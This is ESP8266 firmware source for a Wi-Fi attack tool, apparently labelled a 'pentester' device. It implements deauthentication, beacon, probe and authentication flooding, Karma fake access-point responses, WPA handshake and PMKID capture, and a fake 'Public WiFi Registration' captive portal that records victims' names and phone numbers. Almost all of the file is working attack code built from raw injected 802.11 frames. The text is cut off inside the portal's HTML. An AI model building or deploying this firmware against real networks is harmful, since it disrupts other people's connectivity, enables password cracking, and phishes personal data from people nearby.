#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

extern "C" {
  #include "user_interface.h"
}

namespace Config {
  const int LED_PIN              = 2;
  const char* AP_SSID            = "pentester";
  const char* AP_PASSWORD        = "pentester123";
  const int MAX_CREDENTIALS      = 50;
  const int MAX_SCAN_RESULTS     = 30;
  const int DEAUTH_INTERVAL      = 50;
  const int LED_BLINK_INTERVAL   = 300;
  const int DNS_PORT             = 53;
  const int WEB_PORT             = 80;
  const int ADMIN_PORT           = 8080;
  const int WATCHDOG_TIMEOUT     = 100;
  const int MAX_STRING_LENGTH    = 128;
  const int MAX_HANDSHAKES       = 10;
  const int BEACON_INTERVAL      = 50;
  const int PROBE_INTERVAL       = 30;
  const int AUTH_INTERVAL        = 20;
  const int PMKID_TIMEOUT        = 30000;
  const int KARMA_QUEUE_SIZE     = 8;
  const int CHANNEL_HOP_INTERVAL = 5000;
  const int SEQ_INCREMENT        = 16;
}

struct Credential {
  String name;
  String mobile;
  unsigned long timestamp;
  Credential() : timestamp(0) {}
};

struct HandshakeData {
  uint8_t  bssid[6];
  uint8_t  frames[4][256];
  uint16_t frameLengths[4];
  uint8_t  frameCount;
  bool     complete;
  unsigned long timestamp;
  HandshakeData() { memset(this, 0, sizeof(HandshakeData)); }
};

struct KarmaRequest {
  uint8_t sourceMac[6];
  uint8_t ssidLen;
  char    ssid[33];
};

volatile unsigned long v_packetCount  = 0;
volatile unsigned long v_eapolCount   = 0;
volatile bool          v_newEapol     = false;
volatile uint8_t       v_eapolBssid[6];
volatile uint8_t       v_karmaQueueCount = 0;
KarmaRequest           karmaQueue[Config::KARMA_QUEUE_SIZE];

struct SystemState {
  ESP8266WebServer* server;
  ESP8266WebServer* adminServer;
  DNSServer*        dnsServer;
  bool dnsActive;
  bool deauthActive;
  bool pmkidActive;
  bool portalActive;
  bool snifferActive;
  bool handshakeActive;
  bool beaconFloodActive;
  bool probeFloodActive;
  bool authFloodActive;
  bool karmaActive;
  bool channelHop;
  unsigned long totalRequests;
  unsigned long startTime;
  unsigned long deauthCount;
  unsigned long packetCount;
  unsigned long eapolCount;
  unsigned long handshakeCount;
  unsigned long beaconCount;
  unsigned long probeCount;
  unsigned long authCount;
  unsigned long karmaCount;
  int  credentialCount;
  String scanData;
  String hostData;
  String deauthData;
  String pmkidData;
  String credentialData;
  String handshakeData;
  String beaconData;
  String probeData;
  String authData;
  String karmaData;
  String currentPortalSSID;
  uint8_t  targetBSSID[6];
  uint8_t  broadcastMAC[6];
  int      targetChannel;
  String   targetSSID;
  unsigned long lastDeauth;
  unsigned long lastBlink;
  unsigned long lastWatchdog;
  unsigned long lastBeacon;
  unsigned long lastProbe;
  unsigned long lastAuth;
  unsigned long lastPMKIDCheck;
  unsigned long lastChannelHop;
  uint16_t      seqNumber;
  int    errorCount;
  String lastError;
  Credential  creds[Config::MAX_CREDENTIALS];
  HandshakeData handshakes[Config::MAX_HANDSHAKES];

  SystemState() :
    server(nullptr), adminServer(nullptr), dnsServer(nullptr),
    dnsActive(false), deauthActive(false), pmkidActive(false),
    portalActive(false), snifferActive(false), handshakeActive(false),
    beaconFloodActive(false), probeFloodActive(false), authFloodActive(false),
    karmaActive(false), channelHop(false),
    totalRequests(0), startTime(0),
    deauthCount(0), packetCount(0), eapolCount(0), handshakeCount(0),
    beaconCount(0), probeCount(0), authCount(0), karmaCount(0),
    credentialCount(0), currentPortalSSID(""),
    targetChannel(1), targetSSID(""),
    lastDeauth(0), lastBlink(0), lastWatchdog(0),
    lastBeacon(0), lastProbe(0), lastAuth(0),
    lastPMKIDCheck(0), lastChannelHop(0), seqNumber(0),
    errorCount(0) {
    memset(targetBSSID, 0, 6);
    memset(broadcastMAC, 0xFF, 6);
  }
};

SystemState state;

namespace Packets {
  uint8_t deauthFrame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
  };

  uint8_t beaconFrame[128] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x31, 0x04,
    0x00, 0x00,
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
    0x03, 0x01, 0x06,
    0x05, 0x04, 0x00, 0x01, 0x00, 0x00
  };

  uint8_t probeRequestFrame[64] = {
    0x40, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00,
    0x00, 0x00,
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24
  };

  uint8_t probeResponseFrame[128] = {
    0x50, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x31, 0x04,
    0x00, 0x00,
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
    0x03, 0x01, 0x06,
    0x05, 0x04, 0x00, 0x01, 0x00, 0x00
  };

  uint8_t authFrame[30] = {
    0xB0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00,
    0x01, 0x00, 0x00, 0x00
  };
}

// ---------- Utilities ----------

namespace Utils {
  void logError(const String& err) {
    state.errorCount++;
    state.lastError = err;
    Serial.println(String("ERROR: ") + err);
  }

  String formatUptime(unsigned long ms) {
    unsigned long s = ms / 1000;
    unsigned long m = s / 60;
    unsigned long h = m / 60;
    unsigned long d = h / 24;
    if (d > 0)  return String(d) + "d " + String(h % 24) + "h";
    if (h > 0)  return String(h) + "h " + String(m % 60) + "m";
    if (m > 0)  return String(m) + "m " + String(s % 60) + "s";
    return String(s) + "s";
  }

  bool parseMAC(const String& mac, uint8_t* out) {
    if (mac.length() != 17) { logError("Bad MAC length"); return false; }
    return sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
  }

  String macToStr(const uint8_t* m) {
    char b[18];
    snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(b);
  }

  String htmlEncode(const String& in) {
    String out;
    out.reserve(in.length() + 16);
    for (unsigned i = 0; i < in.length(); i++) {
      char c = in[i];
      switch (c) {
        case '&':  out += "&amp;";  break;
        case '<':  out += "&lt;";   break;
        case '>':  out += "&gt;";   break;
        case '"':  out += "&quot;"; break;
        case '\'': out += "&#39;";  break;
        default:   out += c;
      }
    }
    return out;
  }

  String jsonEncode(const String& in) {
    String out;
    out.reserve(in.length() + 8);
    for (unsigned i = 0; i < in.length(); i++) {
      char c = in[i];
      switch (c) {
        case '"':  out += "\\\""; break;
        case '\\': out += "\\\\"; break;
        case '\n': out += "\\n";  break;
        case '\r': out += "\\r";  break;
        case '\t': out += "\\t";  break;
        default:
          if ((unsigned char)c < 0x20) {
            char buf[8];
            snprintf(buf, sizeof(buf), "\\u%04X", (unsigned char)c);
            out += buf;
          } else {
            out += c;
          }
      }
    }
    return out;
  }

  String sanitizeAlphaNum(const String& in) {
    String out;
    int maxLen = min((int)in.length(), Config::MAX_STRING_LENGTH);
    for (int i = 0; i < maxLen; i++) {
      char c = in[i];
      if (isprint(c) && c != '<' && c != '>' && c != '&' && c != '"' && c != '\'') {
        out += c;
      }
    }
    return out;
  }

  bool validChannel(int ch) { return ch >= 1 && ch <= 13; }

  String encStr(uint8_t t) {
    switch (t) {
      case ENC_TYPE_NONE: return "OPEN";
      case ENC_TYPE_WEP:  return "WEP";
      case ENC_TYPE_TKIP: return "WPA";
      case ENC_TYPE_CCMP: return "WPA2";
      case ENC_TYPE_AUTO: return "WPA/WPA2";
      default:            return "???";
    }
  }

  void feedWdt() { ESP.wdtFeed(); state.lastWatchdog = millis(); }

  void randomMAC(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)RANDOM_REG32;
    mac[0] = (mac[0] & 0xFE) | 0x02;
  }

  void setSeq(uint8_t* frame, uint16_t seq) {
    frame[22] = (frame[22] & 0x0F) | ((seq << 4) & 0xF0);
    frame[23] = (seq >> 4) & 0xFF;
  }
}

// ---------- Forward declarations ----------
void stopKarma();

// ---------- ISR Sniffer Callback ----------

void ICACHE_RAM_ATTR snifferCallback(uint8_t* buf, uint16_t len) {
  if (len < 24) return;
  v_packetCount++;

  if (state.karmaActive && (buf[0] & 0xFC) == 0x40 && v_karmaQueueCount < Config::KARMA_QUEUE_SIZE) {
    if (len > 25 && buf[24] == 0x00) {
      uint8_t slen = buf[25];
      if (slen > 0 && slen <= 32 && (26 + slen) <= len) {
        uint8_t idx = v_karmaQueueCount;
        memcpy(karmaQueue[idx].sourceMac, &buf[10], 6);
        memcpy(karmaQueue[idx].ssid, &buf[26], slen);
        karmaQueue[idx].ssid[slen] = '\0';
        karmaQueue[idx].ssidLen = slen;
        v_karmaQueueCount++;
      }
    }
  }

  if ((state.pmkidActive || state.handshakeActive) && len > 34) {
    if (buf[24] == 0xAA && buf[25] == 0xAA && buf[26] == 0x03 &&
        buf[30] == 0x88 && buf[31] == 0x8E) {
      v_eapolCount++;
      v_newEapol = true;
      memcpy((void*)v_eapolBssid, &buf[16], 6);
    }
  }
}

// ---------- Process EAPOL ----------

static void processEapol() {
  if (!v_newEapol) return;
  v_newEapol = false;
  state.eapolCount = v_eapolCount;

  if (state.pmkidActive) {
    state.pmkidData = String("EAPOL #") + String(state.eapolCount) + String(" from ") +
                      Utils::macToStr((uint8_t*)v_eapolBssid);
  }

  if (state.handshakeActive) {
    uint8_t* bssid = (uint8_t*)v_eapolBssid;
    int idx = -1;
    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
      if (memcmp(state.handshakes[i].bssid, bssid, 6) == 0) { idx = i; break; }
    }
    if (idx == -1) {
      for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
        if (state.handshakes[i].frameCount == 0) {
          idx = i;
          memcpy(state.handshakes[i].bssid, bssid, 6);
          state.handshakes[i].timestamp = millis();
          break;
        }
      }
    }
    if (idx != -1 && !state.handshakes[idx].complete && state.handshakes[idx].frameCount < 4) {
      state.handshakes[idx].frameLengths[state.handshakes[idx].frameCount] = 1;
      state.handshakes[idx].frameCount++;
      if (state.handshakes[idx].frameCount >= 4) {
        state.handshakes[idx].complete = true;
        state.handshakeCount++;
        state.handshakeData = String("Complete 4-way from ") + Utils::macToStr(bssid) +
                              String(" (") + String(state.handshakeCount) + String(" total)");
      }
    }
  }
}

// ---------- Process Karma Queue ----------

static void processKarmaQueue() {
  while (v_karmaQueueCount > 0) {
    uint8_t idx = v_karmaQueueCount - 1;
    uint8_t* src = karmaQueue[idx].sourceMac;
    char*    ssid = karmaQueue[idx].ssid;
    uint8_t  slen = karmaQueue[idx].ssidLen;

    memcpy(&Packets::probeResponseFrame[4],  src, 6);
    memcpy(&Packets::probeResponseFrame[10], state.targetBSSID, 6);
    memcpy(&Packets::probeResponseFrame[16], state.targetBSSID, 6);

    uint32_t ts = millis();
    memcpy(&Packets::probeResponseFrame[24], &ts, 4);

    Packets::probeResponseFrame[36] = 0x00;
    Packets::probeResponseFrame[37] = slen;
    memcpy(&Packets::probeResponseFrame[38], ssid, slen);

    state.seqNumber += Config::SEQ_INCREMENT;
    Utils::setSeq(Packets::probeResponseFrame, state.seqNumber);

    uint16_t frameLen = 38 + slen + 2 + 10 + 3 + 5;
    wifi_send_pkt_freedom(Packets::probeResponseFrame, frameLen, 0);
    state.karmaCount++;
    v_karmaQueueCount--;
  }
}

// ---------- Attacks ----------

namespace Attacks {

  void sendDeauth() {
    if (!state.deauthActive) return;
    memcpy(&Packets::deauthFrame[4],  state.broadcastMAC, 6);
    memcpy(&Packets::deauthFrame[10], state.targetBSSID, 6);
    memcpy(&Packets::deauthFrame[16], state.targetBSSID, 6);
    state.seqNumber += Config::SEQ_INCREMENT;
    Utils::setSeq(Packets::deauthFrame, state.seqNumber);
    if (wifi_send_pkt_freedom(Packets::deauthFrame, sizeof(Packets::deauthFrame), 0) == 0) {
      state.deauthCount++;
      if (state.deauthCount % 100 == 0) {
        state.deauthData = String("Active - Sent: ") + String(state.deauthCount) +
                           String(" | CH: ") + String(state.targetChannel) +
                           String(" | Target: ") + state.targetSSID;
      }
    }
  }

  bool startDeauth(const String& mac, int ch, const String& ssid = "") {
    if (mac.length() == 0) { Utils::logError("Empty MAC"); return false; }
    if (!Utils::parseMAC(mac, state.targetBSSID)) return false;
    if (!Utils::validChannel(ch)) ch = 1;
    state.targetChannel = ch;
    state.targetSSID    = ssid.length() ? ssid : String("Unknown");
    wifi_set_channel(state.targetChannel);
    state.deauthActive = true;
    state.deauthCount  = 0;
    state.deauthData   = String("Started on CH ") + String(ch) + String(" | Target: ") + state.targetSSID;
    Serial.println(String("DEAUTH START | MAC: ") + mac + String(" CH: ") + String(ch));
    return true;
  }

  void stopDeauth() {
    if (!state.deauthActive) return;
    state.deauthActive = false;
    state.deauthData = String("Stopped - Total: ") + String(state.deauthCount);
    Serial.println(String("DEAUTH STOP | Total: ") + String(state.deauthCount));
  }

  bool startPMKID(int ch) {
    if (!Utils::validChannel(ch)) ch = 1;
    state.targetChannel = ch;
    wifi_set_channel(state.targetChannel);
    wifi_set_promiscuous_rx_cb(snifferCallback);
    wifi_promiscuous_enable(1);
    state.pmkidActive   = true;
    state.channelHop    = false;
    v_packetCount = 0;
    v_eapolCount  = 0;
    state.lastPMKIDCheck = millis();
    state.pmkidData = String("Listening on CH ") + String(ch);
    Serial.println(String("PMKID START | CH: ") + String(ch));
    return true;
  }

  void stopPMKID() {
    if (!state.pmkidActive) return;
    state.pmkidActive = false;
    state.channelHop  = false;
    wifi_promiscuous_enable(0);
    state.pmkidData = String("Stopped - Pkts: ") + String(state.packetCount) +
                      String(" EAPOL: ") + String(state.eapolCount);
    Serial.println(String("PMKID STOP | EAPOL: ") + String(state.eapolCount));
  }

  bool startHandshake(int ch) {
    if (!Utils::validChannel(ch)) ch = 1;
    state.targetChannel = ch;
    wifi_set_channel(state.targetChannel);
    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) state.handshakes[i] = HandshakeData();
    state.handshakeCount = 0;
    wifi_set_promiscuous_rx_cb(snifferCallback);
    wifi_promiscuous_enable(1);
    state.handshakeActive = true;
    state.channelHop      = false;
    v_packetCount = 0;
    v_eapolCount  = 0;
    state.handshakeData = String("Listening on CH ") + String(ch);
    Serial.println(String("HANDSHAKE START | CH: ") + String(ch));
    return true;
  }

  void stopHandshake() {
    if (!state.handshakeActive) return;
    state.handshakeActive = false;
    state.channelHop      = false;
    wifi_promiscuous_enable(0);
    state.handshakeData = String("Stopped - EAPOL: ") + String(state.eapolCount) +
                          String(" Handshakes: ") + String(state.handshakeCount);
    Serial.println(String("HANDSHAKE STOP | Complete: ") + String(state.handshakeCount));
  }

  bool startSniffer(int ch) {
    if (!Utils::validChannel(ch)) ch = 1;
    state.targetChannel = ch;
    wifi_set_channel(state.targetChannel);
    wifi_set_promiscuous_rx_cb(snifferCallback);
    wifi_promiscuous_enable(1);
    state.snifferActive = true;
    state.channelHop    = false;
    v_packetCount = 0;
    Serial.println(String("SNIFFER START | CH: ") + String(ch));
    return true;
  }

  void stopSniffer() {
    if (!state.snifferActive) return;
    state.snifferActive = false;
    state.channelHop    = false;
    wifi_promiscuous_enable(0);
    Serial.println(String("SNIFFER STOP | Pkts: ") + String(state.packetCount));
  }

  bool startPortal(String fakeSSID) {
    if (fakeSSID.length() == 0) fakeSSID = String("Free_WiFi");
    fakeSSID = Utils::sanitizeAlphaNum(fakeSSID);
    if (fakeSSID.length() == 0) { Utils::logError("Bad portal SSID"); return false; }
    if (state.pmkidActive)      stopPMKID();
    if (state.snifferActive)    stopSniffer();
    if (state.handshakeActive)  stopHandshake();
    if (state.karmaActive)      ::stopKarma();

    WiFi.mode(WIFI_AP);
    WiFi.softAP(fakeSSID.c_str(), "");
    delay(100);

    if (state.dnsServer->start(Config::DNS_PORT, "*", WiFi.softAPIP())) {
      state.dnsActive        = true;
      state.portalActive     = true;
      state.credentialCount  = 0;
      state.currentPortalSSID = fakeSSID;
      state.credentialData   = String("Active as: ") + fakeSSID;
      Serial.println(String("PORTAL START | SSID: ") + fakeSSID + String(" IP: ") + WiFi.softAPIP().toString());
      return true;
    }
    Utils::logError("DNS start failed");
    return false;
  }

  void stopPortal() {
    if (!state.portalActive) return;
    state.portalActive = false;
    state.dnsActive    = false;
    state.dnsServer->stop();
    WiFi.softAP(Config::AP_SSID, Config::AP_PASSWORD);
    delay(100);
    state.credentialData = String("Stopped - Captured: ") + String(state.credentialCount);
    Serial.println(String("PORTAL STOP | Victims: ") + String(state.credentialCount));
  }

  bool startBeaconFlood(int ch, const String& ssid = "") {
    if (!Utils::validChannel(ch)) ch = 1;
    state.targetChannel    = ch;
    state.targetSSID       = ssid.length() ? ssid : String("FakeAP");
    wifi_set_channel(state.targetChannel);
    state.beaconFloodActive = true;
    state.beaconCount       = 0;
    Utils::randomMAC(state.targetBSSID);
    state.beaconData = String("Started CH ") + String(ch) + String(" | ") + state.targetSSID;
    Serial.println(String("BEACON START | CH: ") + String(ch));
    return true;
  }

  void stopBeaconFlood() {
    if (!state.beaconFloodActive) return;
    state.beaconFloodActive = false;
    state.beaconData = String("Stopped - Total: ") + String(state.beaconCount);
    Serial.println(String("BEACON STOP | Total: ") + String(state.beaconCount));
  }

  void sendBeacon() {
    if (!state.beaconFloodActive) return;
    uint32_t ts = millis();
    memcpy(&Packets::beaconFrame[24], &ts, 4);
    uint8_t slen = min((int)state.targetSSID.length(), 32);
    Packets::beaconFrame[36] = 0x00;
    Packets::beaconFrame[37] = slen;
    memcpy(&Packets::beaconFrame[38], state.targetSSID.c_str(), slen);
    memcpy(&Packets::beaconFrame[10], state.targetBSSID, 6);
    memcpy(&Packets::beaconFrame[16], state.targetBSSID, 6);
    state.seqNumber += Config::SEQ_INCREMENT;
    Utils::setSeq(Packets::beaconFrame, state.seqNumber);
    uint16_t frameLen = 38 + slen + 2 + 10 + 3 + 5;
    if (wifi_send_pkt_freedom(Packets::beaconFrame, frameLen, 0) == 0) {
      state.beaconCount++;
      if (state.beaconCount % 50 == 0)
        state.beaconData = String("Active - ") + String(state.beaconCount) + String(" beacons");
    }
  }

  bool startProbeFlood(int ch, const String& ssid = "") {
    if (!Utils::validChannel(ch)) ch = 1;
    state.targetChannel    = ch;
    state.targetSSID       = ssid.length() ? ssid : String("TargetNetwork");
    wifi_set_channel(state.targetChannel);
    state.probeFloodActive = true;
    state.probeCount       = 0;
    Utils::randomMAC(state.targetBSSID);
    state.probeData = String("Started CH ") + String(ch) + String(" | ") + state.targetSSID;
    Serial.println(String("PROBE START | CH: ") + String(ch));
    return true;
  }

  void stopProbeFlood() {
    if (!state.probeFloodActive) return;
    state.probeFloodActive = false;
    state.probeData = String("Stopped - Total: ") + String(state.probeCount);
  }

  void sendProbe() {
    if (!state.probeFloodActive) return;
    uint8_t slen = min((int)state.targetSSID.length(), 32);
    Packets::probeRequestFrame[24] = 0x00;
    Packets::probeRequestFrame[25] = slen;
    memcpy(&Packets::probeRequestFrame[26], state.targetSSID.c_str(), slen);
    memcpy(&Packets::probeRequestFrame[10], state.targetBSSID, 6);
    state.seqNumber += Config::SEQ_INCREMENT;
    Utils::setSeq(Packets::probeRequestFrame, state.seqNumber);
    uint16_t frameLen = 26 + slen + 10;
    if (wifi_send_pkt_freedom(Packets::probeRequestFrame, frameLen, 0) == 0) {
      state.probeCount++;
      if (state.probeCount % 50 == 0)
        state.probeData = String("Active - ") + String(state.probeCount) + String(" probes");
    }
  }

  bool startAuthFlood(const String& mac, int ch) {
    if (mac.length() == 0) { Utils::logError("Empty MAC for auth"); return false; }
    if (!Utils::parseMAC(mac, state.targetBSSID)) return false;
    if (!Utils::validChannel(ch)) ch = 1;
    state.targetChannel    = ch;
    wifi_set_channel(state.targetChannel);
    state.authFloodActive  = true;
    state.authCount        = 0;
    Utils::randomMAC(state.targetBSSID);
    state.authData = String("Started CH ") + String(ch) + String(" | Target: ") + mac;
    Serial.println(String("AUTH START | CH: ") + String(ch));
    return true;
  }

  void stopAuthFlood() {
    if (!state.authFloodActive) return;
    state.authFloodActive = false;
    state.authData = String("Stopped - Total: ") + String(state.authCount);
  }

  void sendAuth() {
    if (!state.authFloodActive) return;
    Utils::randomMAC(&Packets::authFrame[10]);
    memcpy(&Packets::authFrame[16], state.targetBSSID, 6);
    state.seqNumber += Config::SEQ_INCREMENT;
    Utils::setSeq(Packets::authFrame, state.seqNumber);
    if (wifi_send_pkt_freedom(Packets::authFrame, sizeof(Packets::authFrame), 0) == 0) {
      state.authCount++;
      if (state.authCount % 50 == 0)
        state.authData = String("Active - ") + String(state.authCount) + String(" auths");
    }
  }

  bool startKarma(const String& ssid) {
    if (ssid.length() == 0) { Utils::logError("Empty Karma SSID"); return false; }
    state.targetSSID = ssid;
    state.karmaActive = true;
    state.karmaCount  = 0;
    v_karmaQueueCount = 0;
    Utils::randomMAC(state.targetBSSID);
    wifi_set_promiscuous_rx_cb(snifferCallback);
    wifi_promiscuous_enable(1);
    state.karmaData = String("Started - Responding for: ") + ssid;
    Serial.println(String("KARMA START | SSID: ") + ssid);
    return true;
  }

  void stopKarma() {
    if (!state.karmaActive) return;
    state.karmaActive = false;
    wifi_promiscuous_enable(0);
    state.karmaData = String("Stopped - Responses: ") + String(state.karmaCount);
    Serial.println(String("KARMA STOP | Total: ") + String(state.karmaCount));
  }

  void stopAll() {
    if (state.deauthActive)      stopDeauth();
    if (state.pmkidActive)       stopPMKID();
    if (state.handshakeActive)   stopHandshake();
    if (state.portalActive)      stopPortal();
    if (state.snifferActive)     stopSniffer();
    if (state.beaconFloodActive) stopBeaconFlood();
    if (state.probeFloodActive)  stopProbeFlood();
    if (state.authFloodActive)   stopAuthFlood();
    if (state.karmaActive)       ::stopKarma();
    Serial.println(F("All attacks stopped"));
  }
}

// Global stopKarma that calls into namespace
void stopKarma() { Attacks::stopKarma(); }

// ---------- HTML Fragments ----------

static const char DASH_CSS[] PROGMEM = R"rawliteral(
body{margin:0;padding:10px;font-family:'Courier New',monospace;background:#0a0e27;color:#0f0}
.w{max-width:1200px;margin:0 auto}h1{text-align:center;color:#0f0;font-size:1.8em;margin:15px 0;text-shadow:0 0 10px #0f0}
.b{background:#0f1419;border:2px solid #0f0;border-radius:8px;padding:15px;margin:10px 0;box-shadow:0 0 15px rgba(0,255,0,.2)}
.a{border-color:#f00;background:#1a0000;box-shadow:0 0 15px rgba(255,0,0,.3)}
.warn{background:#ff0;color:#000;padding:10px;text-align:center;font-weight:bold;margin:10px 0;border-radius:5px;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
.g{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin:12px 0}
.btn{padding:12px;text-align:center;border:2px solid;border-radius:6px;text-decoration:none;display:block;font-size:.95em;font-weight:bold;transition:all .3s;cursor:pointer}
.c1{background:#001a1a;color:#0ff;border-color:#0ff}.c1:hover{background:#0ff;color:#000}
.c2{background:#1a1a00;color:#ff0;border-color:#ff0}.c2:hover{background:#ff0;color:#000}
.c3{background:#1a0000;color:#f00;border-color:#f00}.c3:hover{background:#f00;color:#fff}
.c4{background:#1a001a;color:#f0f;border-color:#f0f}.c4:hover{background:#f0f;color:#fff}
table{width:100%;border-collapse:collapse;font-size:.85em;margin:10px 0}
th,td{border:1px solid #0f0;padding:8px;text-align:left}th{background:#001a00}
.mn{padding:4px 8px;background:#0a5;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:.75em}
.mn:hover{background:#0c7}
.st{display:inline-block;margin:5px 10px;padding:8px 15px;background:#001a00;border-radius:5px;border:1px solid #0f0;color:#0f0}
.badge{background:#f00;color:#fff;padding:2px 6px;border-radius:10px;font-size:.8em;margin-left:5px}
.err{color:#f00;font-size:.9em;margin-top:10px}
select{background:#000;color:#0f0;border:1px solid #0f0;padding:5px}
.off{opacity:.5;cursor:not-allowed}
)rawliteral";

static const char PORTAL_CSS[] PROGMEM = R"rawliteral(
body{margin:0;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;
background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center}
.ct{background:#fff;padding:40px;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,.3);max-width:400px;width:100%}
h2{margin:0 0 10px;color:#333;text-align:center;font-size:24px}.sub{text-align:center;color:#666;margin-bottom:30px;font-size:14px}
input{width:100%;padding:14px;margin:12px 0;border:2px solid #e0e0e0;border-radius:8px;box-sizing:border-box;font-size:15px;transition:border .3s}
input:focus{border-color:#667eea;outline:none}
button{width:100%;padding:16px;background:#667eea;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background .3s}
button:hover{background:#5568d3}.info{margin-top:20px;text-align:center;color:#888;font-size:12px}.logo{text-align:center;margin-bottom:20px;font-size:48px}
)rawliteral";

static const char ADMIN_CSS[] PROGMEM = R"rawliteral(
body{font-family:'Courier New',monospace;background:#1a0000;color:#f00;padding:20px;margin:0}
.w{max-width:1000px;margin:0 auto}h1{color:#f00;text-shadow:0 0 15px #f00;text-align:center;font-size:2em;border-bottom:2px solid #f00;padding-bottom:10px}
.b{background:#0f1419;padding:15px;border:2px solid #f00;border-radius:8px;margin:20px 0;box-shadow:0 0 20px rgba(255,0,0,.3)}
.cd{background:#0f1419;padding:15px;margin:10px 0;border-radius:8px;border-left:5px solid #f00;box-shadow:0 0 15px rgba(255,0,0,.2);word-wrap:break-word}
.cnt{color:#ff0;font-size:1.3em;text-align:center;margin:20px 0;padding:15px;background:#1a1a00;border:2px solid #ff0;border-radius:8px}
.empty{text-align:center;color:#ff0;padding:40px;font-size:1.1em}
.g{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin:20px 0}
.btn{padding:15px;text-align:center;border:2px solid;border-radius:8px;text-decoration:none;display:block;font-weight:bold;transition:all .3s;cursor:pointer}
.e1{background:#001a1a;color:#0ff;border-color:#0ff}.e1:hover{background:#0ff;color:#000}
.e2{background:#1a0000;color:#f00;border-color:#f00}.e2:hover{background:#f00;color:#fff}
.e3{background:#1a1a00;color:#ff0;border-color:#ff0}.e3:hover{background:#ff0;color:#000}
textarea{width:100%;min-height:300px;background:#000;color:#0f0;border:2px solid #0f0;padding:10px;font-family:'Courier New',monospace;font-size:.9em;border-radius:5px}
.xs{margin:20px 0;display:none}.xs.show{display:block}
)rawliteral";

static const char HS_CSS[] PROGMEM = R"rawliteral(
body{font-family:'Courier New',monospace;background:#0a0e27;color:#0f0;padding:20px;margin:0}
.w{max-width:1000px;margin:0 auto}h1{color:#0f0;text-shadow:0 0 10px #0f0;text-align:center;font-size:2em;border-bottom:2px solid #0f0;padding-bottom:10px}
.b{background:#0f1419;padding:15px;border:2px solid #0f0;border-radius:8px;margin:20px 0;box-shadow:0 0 20px rgba(0,255,0,.3)}
.hs{background:#0f1419;padding:15px;margin:10px 0;border-radius:8px;border-left:5px solid #0f0;box-shadow:0 0 15px rgba(0,255,0,.2);word-wrap:break-word}
.cnt{color:#ff0;font-size:1.3em;text-align:center;margin:20px 0;padding:15px;background:#1a1a00;border:2px solid #ff0;border-radius:8px}
.empty{text-align:center;color:#ff0;padding:40px;font-size:1.1em}
.g{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin:20px 0}
.btn{padding:15px;text-align:center;border:2px solid;border-radius:8px;text-decoration:none;display:block;font-weight:bold;transition:all .3s;cursor:pointer}
.e1{background:#001a1a;color:#0ff;border-color:#0ff}.e1:hover{background:#0ff;color:#000}
.e2{background:#1a0000;color:#f00;border-color:#f00}.e2:hover{background:#f00;color:#fff}
.e3{background:#1a1a00;color:#ff0;border-color:#ff0}.e3:hover{background:#ff0;color:#000}
textarea{width:100%;min-height:300px;background:#000;color:#0f0;border:2px solid #0f0;padding:10px;font-family:'Courier New',monospace;font-size:.9em;border-radius:5px}
.xs{margin:20px 0;display:none}.xs.show{display:block}
)rawliteral";

namespace HTML {

  String captivePortal() {
    String h;
    h.reserve(1200);
    h += FPSTR(PORTAL_CSS);
    String page;
    page.reserve(1400);
    page = String("<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
           "<meta charset='UTF-8'><title>Public WiFi Registration</title><style>") + h + String("</style></head><body><div class='ct'><div class='logo'>&#128241;</div>"
           "<h2>Public WiFi Registration</h2><div class='sub'>Enter your details to access the network</div>"
           "<form method='POST' action='/submit'>"
